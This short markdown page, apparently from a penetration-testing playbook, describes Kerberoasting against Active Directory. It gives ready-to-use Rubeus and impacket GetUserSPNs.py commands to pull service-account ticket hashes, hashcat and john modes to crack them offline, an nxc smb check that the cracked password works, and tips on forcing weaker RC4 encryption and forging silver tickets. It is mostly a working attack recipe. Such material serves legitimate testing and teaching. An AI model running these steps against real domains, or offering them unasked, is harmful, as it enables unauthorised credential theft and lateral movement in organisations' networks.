# Kerberoast

## When this applies

- Active Directory environment with service accounts that have a `servicePrincipalName` (SPN) set.
- You have any authenticated domain user credential (low-priv is fine).
- You want to extract service-account NT/AES TGS hashes for offline cracking.

## Technique

Request service tickets (TGS) for accounts with SPNs. The KDC encrypts the ticket with the service account's key (NT hash for RC4 / AES key for AES). Crack offline to recover cleartext.

## Steps

```powershell
# Request service tickets
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Crack with hashcat
hashcat -m 13100 hashes.txt wordlist.txt
```

From Linux:

```bash
GetUserSPNs.py 'DOMAIN.LOCAL/user:pass' -dc-ip <DC_IP> -request
GetUserSPNs.py -k -no-pass -dc-ip <DC_IP> -request DOMAIN.LOCAL/user
```

## Verifying success

- Hash output begins with `$krb5tgs$23$...` (RC4) or `$krb5tgs$18$...` (AES256).
- After cracking, the cleartext password authenticates to AD via `nxc smb DC -u svc -p '<pwd>'`.

## Common pitfalls

- AES-only service accounts produce `$krb5tgs$18$` hashes that are slower to crack — try RC4 downgrade if `msDS-SupportedEncryptionTypes` allows it.
- Silver tickets are forged from **Kerberoasted service hashes**, NOT AS-REP-roasted user hashes — wrong key for the SPN.
- See `silver-ticket.md` for forging tickets with the recovered hash.

## Tools

- Rubeus
- impacket `GetUserSPNs.py`
- hashcat (`-m 13100` RC4, `-m 19700` AES256)
- john (`--format=krb5tgs`)
